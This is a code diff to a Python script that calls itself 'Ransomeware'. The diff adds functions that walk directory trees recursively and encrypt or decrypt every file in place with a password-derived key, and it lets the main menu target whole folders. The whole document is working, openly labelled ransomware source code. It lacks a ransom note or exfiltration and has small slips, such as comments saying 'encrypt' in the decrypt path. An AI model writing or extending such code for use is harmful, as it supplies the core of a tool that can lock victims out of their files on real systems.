@@ -50,17 +50,35 @@ def decrypt(filename, key):
 	# write the original file
 	with open(filename, "wb") as file:
 		file.write(decrypted_data)
+def encrypt_folder(folder_name,key):
+	for child in pathlib.Path(folder_name).glob('*'):
+		if child.is_file():
+			print(f"[*] Encrypting {child}")
+			encrypt(child, key)
+		elif child.is_dir():
+			encrypt_folder(child, key)
+def decrypt_folder(foldername, key):
+	# if it's a folder, decrypt the entire folder
+	for child in pathlib.Path(foldername).glob("*"):
+		if child.is_file():
+			print(f"[*] Decrypting {child}")
+			decrypt(child, key)
+		elif child.is_dir():
+			decrypt_folder(child, key)
+
 		
 if __name__ == "__main__":
 	print('Welcome To Ransomeware!')
 	choice = input('1 for Encryption\n2 for Decryption\n>')
 	if choice == '1':
 		password = input('Enter Your Password : ')
-		file = input('Filename : ')
+		file = input('Path : ')
 		key = generate_key(password)
 		if os.path.isfile(file):
 			# if it is a file, encrypt it
 			encrypt(file, key)
+		elif os.path.isdir(file):
+			encrypt_folder(file,key)
 	elif choice == '2':
 		password = input('Enter Your Password : ')
 		file = input('Filename : ')
@@ -69,8 +87,12 @@ if __name__ == "__main__":
 				# if it is a file, encrypt it
 				key=generate_key(password,load_existing_salt=True)
 				decrypt(file, key=key)
+		elif os.path.isdir(file):
+			with open('salt.salt','rb') as salt_file:
+				# if it is a file, encrypt it
+				key=generate_key(password,load_existing_salt=True)
+				decrypt_folder(file, key=key)
 	else:
 		print('Invalid Choice!')
 	
 	
-
